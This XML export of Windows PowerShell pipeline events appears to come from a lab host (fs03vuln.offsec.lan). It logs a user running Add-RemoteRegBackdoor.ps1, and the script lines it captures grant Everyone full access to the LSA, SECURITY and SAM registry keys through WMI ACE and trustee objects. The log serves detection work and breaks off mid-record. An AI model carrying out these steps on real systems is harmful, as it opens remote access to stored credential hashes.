<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54740</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1083

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\Data] Backdooring completed for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54741</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1085

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring started for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54742</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1087

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54743</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1089

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54744</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1091

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Creating the trustee WMI object with user 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54745</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1093

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Trustee"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54746</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1095

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Applying Trustee to new Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54747</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1097

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54748</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1099

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\GBG] Backdooring completed for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54749</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1101

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SECURITY] Backdooring started for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54750</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1103

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54751</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1105

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54752</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1107

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SECURITY] Creating the trustee WMI object with user 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54753</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1109

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Trustee"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54754</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1111

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Applying Trustee to new Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SECURITY] Applying Trustee to new Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54755</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1113

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SECURITY] Calling SetSecurityDescriptor on the key with the newly created Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54756</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1115

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring completed for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SECURITY] Backdooring completed for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54757</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1117

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Backdooring started for key"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SAM\SAM\Domains\Account] Backdooring started for key"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54758</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1119

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SAM\SAM\Domains\Account] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54759</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1121

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()
</Data>
      <Data>CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="System.Management.ManagementClass"
ParameterBinding(New-Object): name="ArgumentList"; value="win32_Ace"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54760</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1123

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=4.0
	RunspaceId=4315d698-493e-410a-8e70-1c07123fdca4
	PipelineId=88
	ScriptName=C:\TOOLS\Add-RemoteRegBackdoor.ps1
	CommandLine=            Write-Verbose "[$Computer : $Key] Creating the trustee WMI object with user '$User'"
</Data>
      <Data>CommandInvocation(Write-Verbose): "Write-Verbose"
ParameterBinding(Write-Verbose): name="Message"; value="[FS03 : SAM\SAM\Domains\Account] Creating the trustee WMI object with user 'Everyone'"
</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="PowerShell" />
      <EventID Qualifiers="0">800</EventID>
      <Level>4</Level>
      <Task>8</Task>
      <Keywords>0x80000000000000</Keywords>
      <TimeCreated SystemTime="2021-12-09T19:54:03.000000000Z" />
      <EventRecordID>54761</EventRecordID>
      <Channel>Windows PowerShell</Channel>
      <Computer>fs03vuln.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data>            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()
</Data>
      <Data>	DetailSequence=1
	DetailTotal=1

	SequenceNumber=1125

	UserId=OFFSEC\hack1
	HostName=ConsoleHost
	HostVersion=4.0
	HostId=a991c134-2e90-418c-940d-258271dd1e9c
